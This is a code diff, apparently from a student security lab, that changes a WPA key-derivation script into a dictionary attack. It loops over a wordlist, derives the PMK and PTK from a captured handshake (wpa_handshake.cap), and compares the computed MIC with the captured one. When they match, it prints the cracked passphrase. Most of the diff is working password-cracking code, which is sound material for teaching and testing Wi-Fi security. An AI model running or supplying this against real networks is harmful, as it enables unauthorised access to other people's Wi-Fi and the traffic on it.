@@ -23,6 +23,13 @@ from numpy import array_split
 from numpy import array
 import hmac, hashlib
 
+
+# MODIFICATION SCAIRCRAK: ouverture du dicionnaire et récupération de chaque ligne
+wordsFile = open("wordlist")
+dico = wordsFile.read().splitlines()
+wordsFile.close()
+
+
 arp = rdpcap('wpa_handshake.cap')
 
 def customPRF512(key,A,B):
@@ -42,53 +49,56 @@ def customPRF512(key,A,B):
 wpa=rdpcap("wpa_handshake.cap") 
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-# MODIFICATION POUR STEP1 : nous avons récupéré le ssid (tram 004) et les adresses source et destination dans le pcap (1ère trame du handshake)
 ssid        = arp[3].info
 APmac       = a2b_hex(arp[5].addr2.replace(':', ''))
 Clientmac   = a2b_hex(arp[5].addr1.replace(':', ''))
 
 
 # Authenticator and Supplicant Nonces
-# MODIFICATION POUR STEP1: nous avons récupéré le nonce de l'AP (1ère trame du handshake) et de la STA (2ème trame du handshake) dans le pcap
 ANonce      = arp[5].load[13:45]
 SNonce	    = arp[6].load[13:45]
 
 # This is the MIC contained in the 4th frame of the 4-way handshake
 # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-# MODIFICATION POUR STEP1: nous avons récupéré le mic (4ème trame du handshake) dans le pcap
 mic_to_test = b2a_hex(arp[8].load)[154:186]
 
 B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
 
 data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée
 
-print "\n\nValues used to derivate keys"
-print "============================"
-print "Passphrase: ",passPhrase,"\n"
-print "SSID: ",ssid,"\n"
-print "AP Mac: ",b2a_hex(APmac),"\n"
-print "CLient Mac: ",b2a_hex(Clientmac),"\n"
-print "AP Nonce: ",b2a_hex(ANonce),"\n"
-print "Client Nonce: ",b2a_hex(SNonce),"\n"
+foundPP = False;
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
+# MODIFICATION SCAIRCRACK: parcours des mots du dico
+for passPhrase in dico:
+    print("Testing with passphrase: " + passPhrase)
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
 
-#expand pmk to obtain PTK
-ptk = customPRF512(a2b_hex(pmk),A,B)
+    #expand pmk to obtain PTK
+    ptk = customPRF512(a2b_hex(pmk),A,B)
 
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+    print("mic: " + str(mic.hexdigest()[:len(mic_to_test)]))
+    print("mic to test: " + mic_to_test + '\n')
 
+    # MODIFICATION SCAIRCRACK: comparaison mic généré et mic attendu
+    if mic.hexdigest()[:len(mic_to_test)] == mic_to_test:
+        print("\nFound passphrase! It's: " + passPhrase + "\n")
+        
+        
+        print "\nResults of the key expansion"
+        print "============================="
+        print "PMK:\t\t",pmk,"\n"
+        print "PTK:\t\t",b2a_hex(ptk),"\n"
+        print "KCK:\t\t",b2a_hex(ptk[0:16]),"\n"
+        print "KEK:\t\t",b2a_hex(ptk[16:32]),"\n"
+        print "TK:\t\t",b2a_hex(ptk[32:48]),"\n"
+        print "MICK:\t\t",b2a_hex(ptk[48:64]),"\n"
+        print "MIC:\t\t",mic.hexdigest(),"\n"
+        foundPP = True
+        break
 
-print "\nResults of the key expansion"
-print "============================="
-print "PMK:\t\t",pmk,"\n"
-print "PTK:\t\t",b2a_hex(ptk),"\n"
-print "KCK:\t\t",b2a_hex(ptk[0:16]),"\n"
-print "KEK:\t\t",b2a_hex(ptk[16:32]),"\n"
-print "TK:\t\t",b2a_hex(ptk[32:48]),"\n"
-print "MICK:\t\t",b2a_hex(ptk[48:64]),"\n"
-print "MIC:\t\t",mic.hexdigest(),"\n"
+if not foundPP:
+	print("Sorry, none of these passphrases worked!")
